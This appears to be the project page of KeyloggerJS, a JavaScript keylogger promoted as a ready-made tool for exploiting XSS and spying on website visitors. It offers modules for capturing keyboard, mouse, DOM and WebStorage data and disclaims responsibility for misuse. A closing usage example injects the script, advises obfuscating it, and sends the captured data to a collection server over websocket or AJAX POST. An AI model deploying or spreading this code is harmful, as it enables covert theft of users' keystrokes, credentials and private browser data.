KeyloggerJS

KeyloggerJS is a tool to spy the client (mouse, keyboard, local data, etc).
download .ZIPdownload .TGZ

KeyloggerJS, simply.

  • Tired of having to code your own tools to exploit XSS ?
  • Need to gather information on the interactions of your users ?
  • Or for any reason, KeyloggerJS interests you ?

KeyloggerJS is divided into modules. Of bases, the modules availables are http, dom, WebStorage, keylog, mouse, and everyone is free to propose new ones.

Philosophy, use && political.

KeyloggerJS, its developers and contributors of all kinds are not responsible for the use made of distributed sources on Github. The internet is free, and we believe that everyone is mature enough to know what is good or not, what is acceptable or not.

This tool is developed by passion above all, everyone is free to contribute (if he wants to bring something to the project).

Here a example of utilisation. First, include KeyloggerJS : 

//# You can change filename and obfuscate the code.
//# It is also possible to include dynamically from JavaScript (also obfuscated).
//# But, basically :
<script src="http://localhost/js/keylog.js"></script>

Next, run KeyloggerJS : var keylog = new keylogger();

// Now, we load a module for starting listening !
keylog.http(3000, function(data) {
     // With websockets
     var socket = io("http://localhost");
     socket.emit("httpKeylog", data);

    // With AJAX
    var xhr = getXMLHttpRequest();
    xhr.open("POST", "keylog.php");
    xhr.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
    xhr.send(JSON.stringify(data));
});
